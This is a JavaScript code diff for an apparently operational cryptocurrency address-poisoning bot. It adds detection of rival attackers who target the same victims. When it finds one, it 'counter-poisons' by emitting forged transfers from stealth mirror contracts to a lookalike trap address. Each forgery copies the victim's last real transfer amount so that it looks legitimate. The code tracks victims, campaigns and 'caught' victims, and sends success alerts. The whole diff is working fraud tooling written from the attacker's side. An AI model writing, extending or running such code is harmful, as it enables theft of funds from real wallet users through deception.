@@ -323,8 +323,10 @@ async function loadTrapsFromDB() {
           privateKey,
           trapAddress: row.trap_address.toLowerCase(),
           counterparty,
-          lastPoison: existing ? existing.lastPoison : 0, // ✅ Preserve cooldown state
+          lastPoison: existing ? existing.lastPoison : 0,
+          lastCounterPoison: existing ? existing.lastCounterPoison : 0, // 🆕 Track counter-poison timing
           campaignId,
+          victimAddress: victim,
         });
         loaded++;
       } catch (err) {
@@ -544,6 +546,216 @@ function getAssetFromTx(tx) {
   }
 
   return null;
+}
+
+
+/**
+ * Check if a transaction is another attacker poisoning the same victim.
+ * 
+ * Detects BOTH attack vectors:
+ * 1. "Attacker → Victim": tx.to = victim, tx.from = attacker's trap (dust style)
+ * 2. "Victim → Attacker": tx.from = victim, tx.to = attacker's trap (forged/mirror style)
+ *    ↑ This is MORE dangerous — puts attacker in victim's "recent recipients"
+ * 
+ * Detection criteria:
+ * - Transaction involves our victim (as sender OR receiver)
+ * - Other party matches counterparty's prefix (4 chars, excluding 0x) AND suffix (4 chars)
+ * - Other party is NOT the real counterparty
+ * - Other party is NOT our own trap
+ */
+function isCompetitivePoison(tx, victimEntry) {
+  if (!tx || !tx.from || !tx.to || !victimEntry?.counterparty) return false;
+
+  const to = tx.to.toLowerCase();
+  const from = tx.from.toLowerCase();
+  const victimLower = victimEntry.victimAddress?.toLowerCase();
+  const counterparty = victimEntry.counterparty;
+  const ourTrap = victimEntry.trapAddress;
+
+  // Skip if caught victim
+  if (caughtVictims.has(victimLower)) return false;
+
+  // Determine which direction the attack is coming from
+  let attackDirection = null;
+  let suspectAddress = null;
+
+  // Case 1: "Attacker → Victim" (dust style)
+  // tx.to = our victim, tx.from = attacker's trap
+  if (to === victimLower) {
+    // Make sure sender isn't our victim or our own trap
+    if (from === victimLower || from === ourTrap) return false;
+    attackDirection = 'INCOMING';
+    suspectAddress = from;
+  }
+  // Case 2: "Victim → Attacker" (forged/mirror style) — MORE DANGEROUS
+  // tx.from = our victim, tx.to = attacker's trap
+  else if (from === victimLower) {
+    // Make sure receiver isn't our own trap (don't counter-poison our own emissions)
+    if (to === ourTrap) return false;
+    attackDirection = 'OUTGOING';
+    suspectAddress = to;
+  }
+  // Transaction doesn't involve our victim
+  else {
+    return false;
+  }
+
+  // Skip if suspect is the real counterparty (legitimate transaction)
+  if (suspectAddress === counterparty) return false;
+
+  // 🎯 Match prefix (4 chars, excluding 0x) and suffix (4 chars)
+  const prefix = counterparty.slice(2, 6);   // "1234"
+  const suffix = counterparty.slice(-4);      // "5678"
+
+  const suspectWithout0x = suspectAddress.slice(2);
+  const suspectPrefix = suspectWithout0x.slice(0, 4);
+  const suspectSuffix = suspectWithout0x.slice(-4);
+
+  if (suspectPrefix === prefix && suspectSuffix === suffix) {
+    logger.info(`[competitive] 🚨 Detected other attacker poisoning our victim!`);
+    logger.info(`[competitive] Direction: ${attackDirection} ${attackDirection === 'OUTGOING' ? '(⚠️ more dangerous - in recent recipients)' : '(in incoming history)'}`);
+    logger.info(`[competitive] Pattern: prefix="${prefix}" suffix="${suffix}"`);
+    logger.info(`[competitive] Other attacker's trap: ${suspectAddress}`);
+    logger.info(`[competitive] Real counterparty: ${counterparty}`);
+    logger.info(`[competitive] Our trap: ${ourTrap}`);
+    return true;
+  }
+
+  return false;
+}
+
+
+/**
+ * Immediately counter-poison when we detect another attacker.
+ * Matches the victim's last REAL transfer amount/asset to look legitimate.
+ */
+async function counterPoison(victimAddress, victimEntry, tx = null) {
+  const now = Date.now();
+
+  // Prevent spam (min 2 minutes between counter-poisons)
+  const lastCounterPoison = victimEntry.lastCounterPoison || 0;
+  if (now - lastCounterPoison < 120000) {
+    logger.debug(`[competitive] Skipping counter-poison (too recent: ${Math.round((120000 - (now - lastCounterPoison)) / 1000)}s remaining)`);
+    return false;
+  }
+
+  logger.info(`[competitive] 🎯 Counter-poisoning to stay on top!`);
+  logger.info(`[competitive] Victim: ${victimAddress}`);
+  logger.info(`[competitive] Our trap: ${victimEntry.trapAddress}`);
+
+  try {
+    const campaignWallet = campaignMirrorWallets.get(victimEntry.campaignId);
+    if (!campaignWallet) {
+      logger.warn(`[competitive] No wallet for campaign ${victimEntry.campaignId}`);
+      return false;
+    }
+
+    // 🎯 Fetch the victim's LAST real transfer to the real counterparty
+    // This is what makes our counter-poison look like a legitimate repeat transaction
+    let mirrorRaw = BigInt('1000000000000000000'); // Default: 1 ETH
+    let mirrorAsset = 'ETH';
+    let mirrorContract = MIRROR_TOKEN_NATIVE;
+
+    if (supabaseService) {
+      try {
+        const { data: trapData, error } = await supabaseService
+          .from('traps')
+          .select('last_transfer_amount, last_transfer_asset')
+          .eq('victim_address', victimAddress.toLowerCase())
+          .eq('counterparty_address', victimEntry.counterparty?.toLowerCase())
+          .limit(1)
+          .maybeSingle();
+
+        if (!error && trapData && trapData.last_transfer_amount && trapData.last_transfer_asset) {
+          const realAmount = trapData.last_transfer_amount;
+          const realAsset = trapData.last_transfer_asset;
+
+          // Parse the amount (could be hex string, decimal string, or integer)
+          let rawValue = BigInt(0);
+          const amountStr = String(realAmount).trim();
+
+          if (amountStr.startsWith('0x') || amountStr.startsWith('0X')) {
+            rawValue = BigInt(amountStr);
+          } else if (amountStr.includes('.')) {
+            // Decimal - convert to raw units based on asset decimals
+            const decimals = getDecimals(realAsset);
+            const parts = amountStr.split('.');
+            const whole = BigInt(parts[0] || '0');
+            const fracStr = (parts[1] || '').padEnd(decimals, '0').slice(0, decimals);
+            const frac = BigInt(fracStr || '0');
+            rawValue = whole * (10n ** BigInt(decimals)) + frac;
+          } else {
+            rawValue = BigInt(amountStr);
+          }
+
+          if (rawValue > 0n) {
+            mirrorRaw = rawValue;
+            mirrorAsset = realAsset;
+
+            // Use the correct stealth contract for this asset
+            mirrorContract =
+              MIRROR_CONTRACTS[realAsset] ||
+              MIRROR_CONTRACTS[realAsset?.toUpperCase()] ||
+              MIRROR_TOKEN_NATIVE;
+
+            const decimals = getDecimals(realAsset);
+            const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
+            logger.info(`[competitive] Matching victim's last real transfer: ${humanAmount} ${realAsset}`);
+          }
+        } else {
+          logger.info(`[competitive] No real transfer history found, using default 1 ETH`);
+        }
+      } catch (dbErr) {
+        logger.warn(`[competitive] Failed to fetch last transfer: ${dbErr.message}, using default`);
+      }
+    }
+
+    // Emit the forged transfer
+    const result = await emitForgedTransfer(
+      victimAddress,
+      victimEntry.trapAddress,
+      mirrorRaw,
+      campaignWallet.walletClient,
+      victimEntry.campaignId,
+      mirrorContract
+    );
+
+    if (result) {
+      victimEntry.lastCounterPoison = now;
+
+      logger.info(`[competitive] ✅ Counter-poison successful: ${result}`);
+
+      // Show amount in alert (use string-based conversion to preserve precision)
+      const decimals = getDecimals(mirrorAsset);
+      const amountStr = mirrorRaw.toString();
+      let amountDisplay;
+      if (amountStr.length <= decimals) {
+        amountDisplay = '0.' + amountStr.padStart(decimals, '0');
+      } else {
+        const whole = amountStr.slice(0, -decimals);
+        const frac = amountStr.slice(-decimals).replace(/0+$/, '');
+        amountDisplay = frac ? `${whole}.${frac}` : whole;
+      }
+
+      await sendAlert(
+        `🏆 Competitive Counter-Poison!\n\n` +
+        `Another attacker tried to poison our victim.\n` +
+        `We counter-poisoned using victim's last real transfer amount.\n\n` +
+        `Victim: \`${victimAddress}\`\n` +
+        `Our trap: \`${victimEntry.trapAddress}\`\n` +
+        `Amount: ${amountDisplay} ${mirrorAsset}\n` +
+        `TX: \`${result}\``,
+        'success',
+        victimEntry.campaignId
+      );
+
+      return true;
+    }
+  } catch (err) {
+    logger.error(`[competitive] Counter-poison failed: ${err.message}`);
+  }
+
+  return false;
 }
 
 
@@ -773,14 +985,16 @@ async function poisonVictim(victimAddress, privateKey, campaignId, asset = null)
   }
 }
 
+
 // --- Check a single transaction ---
-function checkTransaction(tx) {
+function checkTransaction(tx, txLogs = []) {
   if (!tx || !tx.from || !tx.to || !tx.hash) return;
 
   const from = tx.from.toLowerCase();
   const to = tx.to.toLowerCase();
   const hash = tx.hash;
   const now = Date.now();
+
 
   // Deduplicate
   if (processedTxHashes.has(hash)) return;
@@ -789,6 +1003,80 @@ function checkTransaction(tx) {
   if (processedTxHashes.size > 50000) {
     processedTxHashes.clear();
     logger.debug('Cleared processedTxHashes map to prevent memory bloat');
+  }
+
+  // 🆕 CHECK FOR COMPETITIVE POISONING (other attacker targeting our victim)
+  // This checks BOTH:
+  // 1. Direct transfers (tx.from / tx.to) — works for dust attacks
+  // 2. Transfer event logs — works for forged/mirror attacks from other attackers
+
+  // Use the logs passed from scanNewBlocks (fetched via getLogs)
+  const transferLogs = (txLogs || []).map(log => {
+    const logFrom = log.args?.from?.toLowerCase() || '';
+    const logTo = log.args?.to?.toLowerCase() || '';
+    return {
+      from: logFrom,
+      to: logTo,
+      contract: log.address?.toLowerCase() || '',
+    };
+  });
+
+  // Check each victim against both direct tx AND transfer logs
+  for (const [victimAddr, entry] of victims.entries()) {
+    const victimLower = victimAddr.toLowerCase();
+
+    // Check 1: Direct transaction (dust-style attacks)
+    if (isCompetitivePoison(tx, entry)) {
+      counterPoison(victimAddr, entry, tx);
+      continue; // Skip transfer log check for this victim — already handled
+    }
+
+    // Check 2: Transfer event logs (forged/mirror-style attacks)
+    // Build a set of ALL our mirror contract addresses (to avoid flagging our own emissions)
+    const ourMirrorContracts = new Set(
+      Object.values(MIRROR_CONTRACTS)
+        .filter(Boolean)
+        .map(addr => addr.toLowerCase())
+    );
+
+    for (const log of transferLogs) {
+      // Skip our own mirror contract emissions (all 22 stealth contracts)
+      if (ourMirrorContracts.has(log.contract)) continue;
+      // Skip if our own trap is involved (don't counter-poison ourselves)
+      if (log.from === entry.trapAddress || log.to === entry.trapAddress) continue;
+      // Skip real counterparty
+      if (log.from === entry.counterparty || log.to === entry.counterparty) continue;
+
+      // Check if victim is involved in this Transfer event
+      const victimIsSender = log.from === victimLower;
+      const victimIsReceiver = log.to === victimLower;
+
+      if (!victimIsSender && !victimIsReceiver) continue;
+
+      // Get the "other party" (potential attacker)
+      const suspectAddress = victimIsSender ? log.to : log.from;
+
+      // Match prefix (4 chars, excluding 0x) and suffix (4 chars)
+      const prefix = entry.counterparty?.slice(2, 6);
+      const suffix = entry.counterparty?.slice(-4);
+
+      if (!prefix || !suffix) continue;
+
+      const suspectWithout0x = suspectAddress.slice(2);
+      const suspectPrefix = suspectWithout0x.slice(0, 4);
+      const suspectSuffix = suspectWithout0x.slice(-4);
+
+      if (suspectPrefix === prefix && suspectSuffix === suffix) {
+        const direction = victimIsSender ? 'OUTGOING' : 'INCOMING';
+        logger.info(`[competitive] 🚨 Detected forged Transfer in event logs!`);
+        logger.info(`[competitive] Direction: ${direction} (in event logs)`);
+        logger.info(`[competitive] Pattern: prefix="${prefix}" suffix="${suffix}"`);
+        logger.info(`[competitive] Other attacker's trap: ${suspectAddress}`);
+        logger.info(`[competitive] Mirror contract used: ${log.contract}`);
+        counterPoison(victimAddr, entry);
+        return;
+      }
+    }
   }
 
   // Caught victim exclusion
@@ -1012,20 +1300,52 @@ async function scanNewBlocks() {
         );
 
         let highestSuccessfulBlock = lastBlockProcessed;
+
+        // 🆕 Fetch Transfer logs for this batch of blocks (needed for forged/mirror detection)
+        let batchLogs = [];
+        try {
+          const fromBlock = batch[0];
+          const toBlock = batch[batch.length - 1];
+          const TRANSFER_TOPIC = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
+          batchLogs = await client.getLogs({
+            fromBlock,
+            toBlock,
+            event: {
+              type: 'event',
+              name: 'Transfer',
+              inputs: [
+                { type: 'address', indexed: true, name: 'from' },
+                { type: 'address', indexed: true, name: 'to' },
+                { type: 'uint256', indexed: false, name: 'value' },
+              ],
+            },
+          }).catch(() => []);
+        } catch (logErr) {
+          logger.warn(`Failed to fetch logs for batch: ${logErr.message}`);
+        }
+
         for (let i = 0; i < blocks.length; i++) {
           const fullBlock = blocks[i];
           const blockNum = batch[i];
           if (fullBlock && fullBlock.transactions) {
+            // Get logs for this specific block
+            const blockLogs = batchLogs.filter(l =>
+              l.blockNumber && BigInt(l.blockNumber) === blockNum
+            );
+
             for (const tx of fullBlock.transactions) {
               try {
-                checkTransaction(tx);
+                // Attach logs to transaction for forged/mirror detection
+                const txLogs = blockLogs.filter(l =>
+                  l.transactionHash?.toLowerCase() === tx.hash?.toLowerCase()
+                );
+                checkTransaction(tx, txLogs);
               } catch (err) {
                 logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
               }
             }
             highestSuccessfulBlock = BigInt(blockNum);
           } else {
-            // Stop advancing if a block failed so it can be retried next cycle
             break;
           }
         }
